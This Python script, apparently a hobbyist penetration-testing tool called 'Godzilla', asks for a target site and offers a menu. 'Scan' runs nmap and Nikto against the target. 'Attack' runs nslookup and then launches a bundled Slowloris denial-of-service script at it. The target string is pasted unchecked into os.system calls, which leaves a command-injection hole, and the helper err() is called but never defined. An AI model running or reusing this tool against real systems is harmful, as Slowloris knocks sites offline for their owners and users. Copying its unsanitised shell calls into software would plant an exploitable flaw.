import sys
import os
import time
import socket
import getpass
#
#   Author         :    Dank Shiku
#   Version        :    1.0
#   Github         :    https://github.com/Dankshiku
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
#Color
YELLOW = '\033[33m'
BLUE = '\033[34m'
CYAN = '\033[36m'
GREEN = '\033[32;1m'
RED = '\033[31;1m'
WHITE = '\033[m'
#
#Banner
banner= ''' \033[32;1m
 █████╗   ██████╗ ██████╗ ███████╗██╗██╗     ██╗      █████╗
██╔════╝ ██╔═══██╗██╔══██╗╚══███╔╝██║██║     ██║     ██╔══██╗
██║  ███╗██║   ██║██║  ██║  ███╔╝ ██║██║     ██║     ███████║
██║   ██║██║   ██║██║  ██║ ███╔╝  ██║██║     ██║     ██╔══██║
╚██████╔╝╚██████╔╝██████╔╝███████╗██║███████╗███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ \033[32;1m
    \033[m  Tool Created by @Dankshiku \033[m\033[31;1m
 ╔═════════════════════════════════════════════════╗
 ║ [+]Github - https://github.com/Dankshiku        ║
 ║ [+]Telegram - Dankshiku                         ║
 ╚═════════════════════════════════════════════════╝
                                                                           \033[31;1m'''
#code
os.system("clear")
time.sleep(1)
print(banner)
target = input(" Target (ex: www.example.com) : \033[m")
def scan():
      os.system(" clear ")
      print(banner)
      print("")
      print ("\033[31;1m[+]\033[31;1m\033[m Nmap \033[m ")
      print("")
      os.system(" nmap "+target+"")
      time.sleep(5)
      print("")
      print ("\033[31;1m[+]\033[31;1m\033[m Nikto \033[m ")
      print("")
      os.system("perl nikto/program/nikto.pl -h "+target+"")
      print("")
      menu()
def attack():
      os.system(" clear ")
      print (banner)
      print("")
      print ("\033[33m [+] ONLY FOR EDUCATIONAL PURPOSES!!!")
      print("")
      print("")
      print ("╔════════════════════════════════════════╗")
      os.system("nslookup "+target+"")
      print ("╚════════════════════════════════════════╝")
      print("")
      os.system("python module/Slowloris/Slowloris.py "+target+"")
      print("")
      menu()
def menu():
	print("")
	global authtoken
	while True:
		try:
			print(WHITE + '\n'+'['+RED+'1'+WHITE+']'+' Attack')
			print('['+RED+'2'+WHITE+']'+' Scan')
			print('['+RED+'3'+WHITE+']'+' Exit')
			x = input('\n'+RED+'Enter Choice: '+WHITE)
			if x.isdigit():
				if x == '1':
					attack()
				elif x == '2':
					scan()
				elif x == '3':
					exit()
				else:
					err('Invalid Choice')
			else:
				err('Enter a number')
		except Exception as e:
			err('SOME UNKNOWN ERROR OCCURED: '+str(e.args))
			exit()
def main():
      menu()
main()
